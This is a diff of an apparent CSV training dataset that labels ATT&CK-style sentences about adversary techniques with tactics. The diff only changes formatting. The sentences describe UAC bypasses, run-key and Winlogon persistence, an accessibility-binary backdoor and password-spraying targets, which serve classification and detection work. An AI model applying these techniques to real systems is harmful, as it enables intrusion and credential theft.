@@ -637,8 +637,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model] objects without prompting the user through the UAC notification box.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "Many methods have been discovered to bypass UAC.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
-"Additional bypass methods are regularly discovered and some used in the wild, such as:
-
+"Additional bypass methods are regularly discovered and some used in the wild, such as:
+
+
+
 * eventvwr.exe can auto-elevate and execute a specified binary or script.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
@@ -858,19 +860,11 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols.",COLLECTION,CREDENTIAL_ACCESS
 "This may also enable follow-on behaviors such as [Network Sniffing] or [Transmitted Data Manipulation].",COLLECTION,CREDENTIAL_ACCESS
 "DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.",COLLECTION,CREDENTIAL_ACCESS
-"The typical server-client interaction is as follows: 
-
-1.",COLLECTION,CREDENTIAL_ACCESS
-"The client broadcasts a `DISCOVER` message.
-
-2.",COLLECTION,CREDENTIAL_ACCESS
-"The server responds with an `OFFER` message, which includes an available network address. 
-
-3.",COLLECTION,CREDENTIAL_ACCESS
-"The client broadcasts a `REQUEST` message, which includes the network address offered. 
-
-4.",COLLECTION,CREDENTIAL_ACCESS
-"The server acknowledges with an `ACK` message and the client receives the network configuration parameters.",COLLECTION,CREDENTIAL_ACCESS
+"The typical server-client interaction is as follows: 
+1. The client broadcasts a `DISCOVER` message.
+2. The server responds with an `OFFER` message, which includes an available network address. 
+3. The client broadcasts a `REQUEST` message, which includes the network address offered. 
+4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.",COLLECTION,CREDENTIAL_ACCESS
 "Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations.",COLLECTION,CREDENTIAL_ACCESS
 "For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.",COLLECTION,CREDENTIAL_ACCESS
 "Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.",COLLECTION,CREDENTIAL_ACCESS
@@ -1003,11 +997,16 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation.",PERSISTENCE,PRIVILEGE_ESCALATION
 "A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors.",PERSISTENCE,PRIVILEGE_ESCALATION
-"The Registry key contains entries for the following:
-
-* Local Port
-* Standard TCP/IP Port
-* USB Monitor
+"The Registry key contains entries for the following:
+
+
+
+* Local Port
+
+* Standard TCP/IP Port
+
+* USB Monitor
+
 * WSD Port.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1028,28 +1027,46 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The startup folder path for the current user is C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The startup folder path for all users is C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.",PERSISTENCE,PRIVILEGE_ESCALATION
-"The following run keys are created by default on Windows systems:
-
-* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
-* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+"The following run keys are created by default on Windows systems:
+
+
+
+* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+
 * HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Run keys may exist under multiple hives.",PERSISTENCE,PRIVILEGE_ESCALATION
-"The following Registry keys can be used to set startup folder items for persistence:
-
-* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
-* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
-* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+"The following Registry keys can be used to set startup folder items for persistence:
+
+
+
+* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+
+* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+
+* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+
 * HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders.",PERSISTENCE,PRIVILEGE_ESCALATION
-"The following Registry keys can control automatic startup of services during boot:
-
-* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
-* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
-* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
+"The following Registry keys can control automatic startup of services during boot:
+
+
+
+* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+
+* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+
+* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
+
 * HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices.",PERSISTENCE,PRIVILEGE_ESCALATION
-"Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
-
-* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+"Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
+
+
+
+* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+
 * HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Most of these actions are under the control of the operating system, but you can also add custom actions here.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1079,10 +1096,14 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Registry entries in HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables.",PERSISTENCE,PRIVILEGE_ESCALATION
-"Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 
-
-* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
-* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
+"Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 
+
+
+
+* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
+
+* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
+
 * Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may modify XDG autostart entries to execute programs or commands during system boot.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1108,8 +1129,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The malicious script is executed upon the next user login.",PERSISTENCE,PRIVILEGE_ESCALATION
 "If a login hook already exists, adversaries can add additional commands to an existing login hook.",PERSISTENCE,PRIVILEGE_ESCALATION
-"There can be only one login and logout hook on a system at a time.
-
+"There can be only one login and logout hook on a system at a time.
+
+
+
 **Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon] and [Launch Agent].",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Windows allows logon scripts to be run whenever a specific user or group of users log into a system.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1169,19 +1192,32 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.",CREDENTIAL_ACCESS
 "Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.",CREDENTIAL_ACCESS
 "Typically, management services over commonly used ports are used when stuffing credentials.",CREDENTIAL_ACCESS
-"Commonly targeted services include the following:
-
-* SSH (22/TCP)
-* Telnet (23/TCP)
-* FTP (21/TCP)
-* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
-* LDAP (389/TCP)
-* Kerberos (88/TCP)
-* RDP / Terminal Services (3389/TCP)
-* HTTP/HTTP Management Services (80/TCP & 443/TCP)
-* MSSQL (1433/TCP)
-* Oracle (1521/TCP)
-* MySQL (3306/TCP)
+"Commonly targeted services include the following:
+
+
+
+* SSH (22/TCP)
+
+* Telnet (23/TCP)
+
+* FTP (21/TCP)
+
+* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
+
+* LDAP (389/TCP)
+
+* Kerberos (88/TCP)
+
+* RDP / Terminal Services (3389/TCP)
+
+* HTTP/HTTP Management Services (80/TCP & 443/TCP)
+
+* MSSQL (1433/TCP)
+
+* Oracle (1521/TCP)
+
+* MySQL (3306/TCP)
+
 * VNC (5900/TCP).",CREDENTIAL_ACCESS
 "In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.",CREDENTIAL_ACCESS
 "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping] can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash] is not an option.",CREDENTIAL_ACCESS
@@ -1195,20 +1231,34 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.",CREDENTIAL_ACCESS
 "Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.",CREDENTIAL_ACCESS
 "Typically, management services over commonly used ports are used when guessing passwords.",CREDENTIAL_ACCESS
-"Commonly targeted services include the following:
-
-* SSH (22/TCP)
-* Telnet (23/TCP)
-* FTP (21/TCP)
-* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
-* LDAP (389/TCP)
-* Kerberos (88/TCP)
-* RDP / Terminal Services (3389/TCP)
-* HTTP/HTTP Management Services (80/TCP & 443/TCP)
-* MSSQL (1433/TCP)
-* Oracle (1521/TCP)
-* MySQL (3306/TCP)
-* VNC (5900/TCP)
+"Commonly targeted services include the following:
+
+
+
+* SSH (22/TCP)
+
+* Telnet (23/TCP)
+
+* FTP (21/TCP)
+
+* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
+
+* LDAP (389/TCP)
+
+* Kerberos (88/TCP)
+
+* RDP / Terminal Services (3389/TCP)
+
+* HTTP/HTTP Management Services (80/TCP & 443/TCP)
+
+* MSSQL (1433/TCP)
+
+* Oracle (1521/TCP)
+
+* MySQL (3306/TCP)
+
+* VNC (5900/TCP)
+
 * SNMP (161/UDP and 162/TCP/UDP).",CREDENTIAL_ACCESS
 "In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.",CREDENTIAL_ACCESS
 "In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",CREDENTIAL_ACCESS
@@ -1216,19 +1266,32 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain.",CREDENTIAL_ACCESS
 "Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.",CREDENTIAL_ACCESS
 "Typically, management services over commonly used ports are used when password spraying.",CREDENTIAL_ACCESS
-"Commonly targeted services include the following:
-
-* SSH (22/TCP)
-* Telnet (23/TCP)
-* FTP (21/TCP)
-* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
-* LDAP (389/TCP)
-* Kerberos (88/TCP)
-* RDP / Terminal Services (3389/TCP)
-* HTTP/HTTP Management Services (80/TCP & 443/TCP)
-* MSSQL (1433/TCP)
-* Oracle (1521/TCP)
-* MySQL (3306/TCP)
+"Commonly targeted services include the following:
+
+
+
+* SSH (22/TCP)
+
+* Telnet (23/TCP)
+
+* FTP (21/TCP)
+
+* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
+
+* LDAP (389/TCP)
+
+* Kerberos (88/TCP)
+
+* RDP / Terminal Services (3389/TCP)
+
+* HTTP/HTTP Management Services (80/TCP & 443/TCP)
+
+* MSSQL (1433/TCP)
+
+* Oracle (1521/TCP)
+
+* MySQL (3306/TCP)
+
 * VNC (5900/TCP).",CREDENTIAL_ACCESS
 "In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.",CREDENTIAL_ACCESS
 "In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",CREDENTIAL_ACCESS
@@ -1435,8 +1498,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence.",PERSISTENCE,PRIVILEGE_ESCALATION
 "When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.",PERSISTENCE,PRIVILEGE_ESCALATION
-"Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.
-
+"Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.
+
+
+
  Launch Agents can also be executed using the [Launchctl] command.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1454,10 +1519,14 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources. system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Systemd utilizes configuration files known as service units to control how services boot and under what conditions.",PERSISTENCE,PRIVILEGE_ESCALATION
 "By default, these unit files are stored in the /etc/systemd/system and /usr/lib/systemd/system directories and have the file extension .service.",PERSISTENCE,PRIVILEGE_ESCALATION
-"Each service unit file may contain numerous directives that can execute system commands:
-
-* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. 
-* ExecReload directive covers when a service restarts. 
+"Each service unit file may contain numerous directives that can execute system commands:
+
+
+
+* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. 
+
+* ExecReload directive covers when a service restarts. 
+
 * ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.",PERSISTENCE,PRIVILEGE_ESCALATION
 "While adversaries typically require root privileges to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as ~/.config/systemd/user/ to achieve user-level persistence.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1497,7 +1566,8 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may also directly read Login Keychain credentials from the ~/Library/Keychains/login.keychain file.",CREDENTIAL_ACCESS
 "Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.",CREDENTIAL_ACCESS
 "Adversaries may acquire user credentials from third-party password managers.",CREDENTIAL_ACCESS
-"Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.
+"Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.
+
  Adversaries may also try brute forcing via [Password Guessing] to obtain the master password of a password manager.",CREDENTIAL_ACCESS
 "An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain.",CREDENTIAL_ACCESS
 "This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.",CREDENTIAL_ACCESS
@@ -1615,15 +1685,24 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may leverage information repositories to mine valuable information.",COLLECTION
 "Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.",COLLECTION
 "Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.",COLLECTION
-"The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:
-
-* Policies, procedures, and standards
-* Physical / logical network diagrams
-* System architecture diagrams
-* Technical system documentation
-* Testing / development credentials
-* Work / project schedules
-* Source code snippets
+"The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:
+
+
+
+* Policies, procedures, and standards
+
+* Physical / logical network diagrams
+
+* System architecture diagrams
+
+* Technical system documentation
+
+* Testing / development credentials
+
+* Work / project schedules
+
+* Source code snippets
+
 * Links to network shares and other internal resources.",COLLECTION
 "Information stored in a repository may vary based on the specific instance or environment.",COLLECTION
 "Specific common information repositories include web-based platforms such as [Sharepoint] and [Confluence], specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",COLLECTION
@@ -1634,27 +1713,45 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.",COLLECTION
 "Having access to software's source code may allow adversaries to develop [Exploits], while credentials may provide access to additional resources using [Valid Accounts].",COLLECTION
 "Adversaries may leverage Confluence repositories to mine valuable information.",COLLECTION
-"Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:
-
-* Policies, procedures, and standards
-* Physical / logical network diagrams
-* System architecture diagrams
-* Technical system documentation
-* Testing / development credentials
-* Work / project schedules
-* Source code snippets
+"Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:
+
+
+
+* Policies, procedures, and standards
+
+* Physical / logical network diagrams
+
+* System architecture diagrams
+
+* Technical system documentation
+
+* Testing / development credentials
+
+* Work / project schedules
+
+* Source code snippets
+
 * Links to network shares and other internal resources.",COLLECTION
 "Adversaries may leverage the SharePoint repository as a source to mine valuable information.",COLLECTION
 "SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems.",COLLECTION
-"For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:
-
-* Policies, procedures, and standards
-* Physical / logical network diagrams
-* System architecture diagrams
-* Technical system documentation
-* Testing / development credentials
-* Work / project schedules
-* Source code snippets
+"For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:
+
+
+
+* Policies, procedures, and standards
+
+* Physical / logical network diagrams
+
+* System architecture diagrams
+
+* Technical system documentation
+
+* Testing / development credentials
+
+* Work / project schedules
+
+* Source code snippets
+
 * Links to network shares and other internal resources.",COLLECTION
 "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.",COLLECTION
 "Adversaries may do this using a [Command and Scripting Interpreter], such as [cmd] as well as a [Network Device CLI], which have functionality to interact with the file system to gather information.",COLLECTION
@@ -1768,25 +1865,29 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.",DISCOVERY
 "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing.",INITIAL_ACCESS
 "With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token].",INITIAL_ACCESS
-"Multiple ways of delivering exploit code to a browser exist, including:
-
-* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
-* Malicious ads are paid for and served through legitimate ad providers.
+"Multiple ways of delivering exploit code to a browser exist, including:
+
+
+
+* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
+
+* Malicious ads are paid for and served through legitimate ad providers.
+
 * Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).",INITIAL_ACCESS
 "Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest.",INITIAL_ACCESS
 "This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack.",INITIAL_ACCESS
 "There are several known examples of this occurring.",INITIAL_ACCESS
-"Typical drive-by compromise process:
-
-1.",INITIAL_ACCESS
-"A user visits a website that is used to host the adversary controlled content.
-2.",INITIAL_ACCESS
-"Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
-    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
-3.",INITIAL_ACCESS
-"Upon finding a vulnerable version, exploit code is delivered to the browser.
-4.",INITIAL_ACCESS
-"If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
+"Typical drive-by compromise process:
+
+
+
+1. A user visits a website that is used to host the adversary controlled content.
+
+2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
+    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
+3. Upon finding a vulnerable version, exploit code is delivered to the browser.
+
+4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
     * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.",INITIAL_ACCESS
 "Unlike [Exploit Public-Facing Application], the focus of this technique is to exploit software on a client endpoint upon visiting a website.",INITIAL_ACCESS
 "This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",INITIAL_ACCESS
@@ -1932,12 +2033,18 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP).  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.",PERSISTENCE,PRIVILEGE_ESCALATION
 "For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access).",PERSISTENCE,PRIVILEGE_ESCALATION
 "Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol] will cause the replaced file to be executed with SYSTEM privileges.",PERSISTENCE,PRIVILEGE_ESCALATION
-"Other accessibility features exist that may also be leveraged in a similar fashion: 
-
-* On-Screen Keyboard: C:\Windows\System32\osk.exe
-* Magnifier: C:\Windows\System32\Magnify.exe
-* Narrator: C:\Windows\System32\Narrator.exe
-* Display Switcher: C:\Windows\System32\DisplaySwitch.exe
+"Other accessibility features exist that may also be leveraged in a similar fashion: 
+
+
+
+* On-Screen Keyboard: C:\Windows\System32\osk.exe
+
+* Magnifier: C:\Windows\System32\Magnify.exe
+
+* Narrator: C:\Windows\System32\Narrator.exe
+
+* Display Switcher: C:\Windows\System32\DisplaySwitch.exe
+
 * App Switcher: C:\Windows\System32\AtBroker.exe.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1955,13 +2062,19 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS.",PERSISTENCE,PRIVILEGE_ESCALATION
 "When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb).",PERSISTENCE,PRIVILEGE_ESCALATION
 "If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.",PERSISTENCE,PRIVILEGE_ESCALATION
-"A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:
-
-* %WINDIR%\AppPatch\sysmain.sdb and
+"A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:
+
+
+
+* %WINDIR%\AppPatch\sysmain.sdb and
+
 * hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb.",PERSISTENCE,PRIVILEGE_ESCALATION
-"Custom databases are stored in:
-
-* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and
+"Custom databases are stored in:
+
+
+
+* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and
+
 * hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom.",PERSISTENCE,PRIVILEGE_ESCALATION
 "To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim.",PERSISTENCE,PRIVILEGE_ESCALATION
 "However, certain shims can be used to [Bypass User Account Control] (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -1974,10 +2087,14 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "System file associations are listed under HKEY_CLASSES_ROOT\.[extension], for example HKEY_CLASSES_ROOT\.txt.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler].",PERSISTENCE,PRIVILEGE_ESCALATION
 "The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command.",PERSISTENCE,PRIVILEGE_ESCALATION
-"For example: 
-
-* HKEY_CLASSES_ROOT\txtfile\shell\open\command
-* HKEY_CLASSES_ROOT\txtfile\shell\print\command
+"For example: 
+
+
+
+* HKEY_CLASSES_ROOT\txtfile\shell\open\command
+
+* HKEY_CLASSES_ROOT\txtfile\shell\print\command
+
 * HKEY_CLASSES_ROOT\txtfile\shell\printto\command.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The values of the keys listed are commands that are executed when the handler opens the file extension.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries can modify these values to continually execute arbitrary commands.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -2020,8 +2137,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
